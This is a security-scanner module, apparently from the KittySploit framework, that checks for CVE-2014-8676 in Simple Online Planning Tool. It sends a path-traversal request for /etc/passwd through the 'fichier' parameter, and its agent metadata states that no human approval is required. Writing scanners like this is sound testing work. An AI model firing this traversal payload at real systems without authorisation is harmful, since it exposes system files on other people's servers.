#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SOPlanning <1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Simple Online Planning Tool <1.3.2 - Local File Inclusion Detection',
        'description': 'SOPlanning <1.32 contain a directory traversal in the file_get_contents function via a .. (dot dot) in the fichier parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'packetstorm', 'edb', 'seclists', 'soplanning', 'lfi', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/132654/Simple-Online-Planning-Tool-1.3.2-XSS-SQL-Injection-Traversal.html',
            'https://www.exploit-db.com/exploits/37604/',
            'http://seclists.org/fulldisclosure/2015/Jul/44',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-8676',
            'http://packetstormsecurity.com/files/132654/Simple-Online-Planning-Tool-1.3.2-XSS-SQL-Injection-Traversal.html',
        ],
        'cve': 'CVE-2014-8676',
    }

    def run(self):
        r = self.http_request(method="GET", path='/process/feries.php?fichier=../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Simple Online Planning Tool <1.3.2 - Local File Inclusion detected",
                path='/process/feries.php?fichier=../../../../../../../etc/passwd',
            )
            return True
        return False

